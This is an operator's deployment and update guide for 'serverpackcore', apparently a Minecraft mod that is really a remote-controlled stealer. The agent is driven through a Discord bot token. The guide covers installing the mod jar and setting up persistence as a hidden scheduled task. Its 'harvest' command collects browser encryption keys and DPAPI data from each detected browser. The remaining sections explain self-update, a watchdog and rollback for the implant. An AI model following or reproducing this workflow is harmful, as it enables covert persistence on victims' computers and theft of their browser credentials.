WINDOWS DEPLOYMENT - Server Pack Core 0.1.5

Copy only the .jar, do not run it from the shared drive.

0.1.5 supersedes 0.1.4: it adds a 10 minute late-failure watchdog after the
20 s stability check, a restart backoff on late rollback, and intent markers so
`kill` and newer updates are respected. 0.1.4 adds signed self-update, deferred
mod swap and an optional automatic schedule. 0.1.3 still connects, but remove
it: only one serverpackcore jar may stay enabled. 0.1.1 and 0.1.2 use the
revoked Discord token and no longer connect at all.

1. Go to the mods folder of the Fabric 1.20.1 profile (by default
   %APPDATA%\.minecraft\mods) and delete serverpackcore-0.1.1.jar,
   serverpackcore-0.1.2.jar, serverpackcore-0.1.3.jar and
   serverpackcore-0.1.4.jar if present.

2. Copy serverpackcore-0.1.5.jar into that folder.

3. Close Minecraft and check that no agent remains:

   tasklist | findstr /i "spc-sync"
   taskkill /f /im spc-sync.exe

4. Open Minecraft with the Fabric profile, enter a world and wait 20-60 s.

5. Confirm the new version is running:

   type "%LOCALAPPDATA%\ServerPackCore\state.json"

   It must show "version":"0.1.5".

6. Verify the file:

   certutil -hashfile serverpackcore-0.1.5.jar SHA256

   It must return:
   1b0a243b78c77a047e64a209cb67c569f637cb1ef31590135432a2cf8b161209

7. Send `persist on`. Expected reply: "Persistence on: true" and
   "Hidden task: \ServerPackCore". The old task is overwritten, not
   duplicated.

8. Send `harvest`. For each detected browser, the ZIP must contain
   browsers/<browser>/keys.txt with a v10= line (and app_bound= if present).
   If it has error=, Windows has PowerShell restricted: Local State and
   dpapi/ remain as fallback.

UPDATE

`update` checks, stages, applies and restarts on its own; the mod waits until
Minecraft closes. `update check` only reports, `update stage` leaves both jars
prepared, `update apply <version>` applies an already staged jar. `update
rollback` returns to the previous agent and mod and works inside the watchdog
window. `update auto on` schedules runs every 24 h; `update auto off` cancels.

After the new agent stays up for 20 s the helper watches it for another
10 minutes. A late crash restores the previous agent and counts one automatic
failure with backoff. `kill` during the window stops without a restart, and a
newer update makes the old helper exit instead of fighting it. The Windows VBS
helper mirrors this logic but is still untested on a real host. The
0.1.4 -> 0.1.5 hop is prepared by the 0.1.4 helper, so the watchdog first
governs updates made after 0.1.5 is installed.

ROLLBACK

If 0.1.5 fails: `persist off`, close Minecraft and delete 0.1.5. Restoring
serverpackcore-0.1.4.jar is valid and keeps self-update. serverpackcore-0.1.3.jar
also still connects but lacks the update features. serverpackcore-0.1.2.jar is
only useful for offline diagnostics because its token is revoked. The hash of
every build is in SHA256.txt.
